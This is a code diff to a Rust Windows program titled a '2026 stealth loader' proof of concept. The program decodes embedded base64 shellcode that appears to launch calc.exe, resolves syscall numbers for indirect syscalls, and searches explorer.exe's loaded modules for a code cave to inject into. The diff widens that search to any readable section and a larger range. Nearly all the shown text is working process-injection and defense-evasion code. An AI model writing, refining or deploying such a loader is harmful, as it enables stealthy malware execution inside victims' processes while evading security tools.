@@ -1,6 +1,8 @@
 #![allow(non_snake_case)]
 #![allow(non_camel_case_types)]
 #![allow(dead_code)]
+#![allow(unused_assignments)]
+#![allow(unused_parens)]
 
 use std::ffi::{c_void, CStr};
 use std::ptr::null_mut;
@@ -10,7 +12,7 @@ use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    ULTIMATE 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
+    2026 STEALTH LOADER - ULTIMATE ROBUSTNESS PoC (v7)
     ================================================================================
 */
 
@@ -120,7 +122,7 @@ unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)
 // --- Main Program ---
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("[*] Final 2026 Stealth Loader Refined PoC");
+    println!("[*] Final 2026 Stealth Loader - Deep Diagnostics v7");
     let payload_b64 = "/EiD5PDozAAAAEFRQVBSU1pIidpmaEiLUmBJi1IYSItSIPpI81BJi0pMTT1JSIHArDxhfAIsIEHB6Q1BAcHifVJBX0iLUmCLQjxIAXCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSgHQ41ZI/8lBiTSISEEB1DgsKHXxtANMJAglOdFYWEGLNCBJAUDmQYtMSBFA0EGLBIdIAXDQAVhBWF5ZWmFbWVlIidwgUlL+4FhBWVpIixLpV////11IugEAAAAAAAAAVUiNjQEBQEe6MYtvh//Vu7C1olZBuqaVvW3/1UgDxCg8BnYKiPvgeQW7RxNyNm8AWUf91WNhbGMuZXhlAA==";
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
@@ -173,10 +175,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let mut curr_link = ldr_copy.InLoadOrderModuleList.Flink;
         let mut cave_addr = 0usize;
-        println!("[*] Searching for code cave in explorer.exe...");
+        println!("[*] Aggressive search for code cave in explorer.exe...");
 
         let mut module_count = 0;
-        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY && module_count < 100 {
+        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY && module_count < 500 {
             module_count += 1;
             let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
             sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
@@ -186,7 +188,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
                 let name = String::from_utf16_lossy(&n_buf).to_lowercase();
 
-                if !name.contains("ntdll") && !name.contains("kernel") {
+                if !name.contains("ntdll") && !name.contains("kernel32") {
                     let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
                     sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
 
@@ -199,21 +201,25 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                             let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
                             sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
 
-                            if (s.Name[0] == b'.' && s.Name[1] == b't' && s.Name[2] == b'e') || (s.Name[0] == b'.' && s.Name[1] == b'r' && s.Name[2] == b'd') {
+                            // Check any readable section
+                            if (s.Characteristics & 0x40000000 != 0) {
                                 let start = entry.DllBase as usize + s.VirtualAddress as usize;
                                 let size = s.Misc.VirtualSize as usize;
-                                let search_len = if size > 65536 { 65536 } else { size };
+                                // Increase search range significantly
+                                let search_len = if size > 131072 { 131072 } else { size };
                                 let search_start = start + size - search_len;
                                 let mut t_buf = vec![0u8; search_len];
-                                sys_call(ssn_read, gadget, h_proc as usize, search_start, t_buf.as_mut_ptr() as usize, search_len, 0, 0, 0, 0, 0, 0, 0);
+                                let r_st = sys_call(ssn_read, gadget, h_proc as usize, search_start, t_buf.as_mut_ptr() as usize, search_len, 0, 0, 0, 0, 0, 0, 0);
 
-                                let mut count = 0;
-                                for j in (0..search_len).rev() {
-                                    if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
-                                    if count >= shellcode.len() {
-                                        cave_addr = search_start + j;
-                                        println!("[+] Suitable cave found in module {} at 0x{:x}", name, cave_addr);
-                                        break;
+                                if r_st == 0 {
+                                    let mut count = 0;
+                                    for j in (0..search_len).rev() {
+                                        if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
+                                        if count >= shellcode.len() {
+                                            cave_addr = search_start + j;
+                                            println!("[+] Suitable cave found in module {} at 0x{:x}", name, cave_addr);
+                                            break;
+                                        }
                                     }
                                 }
                             }
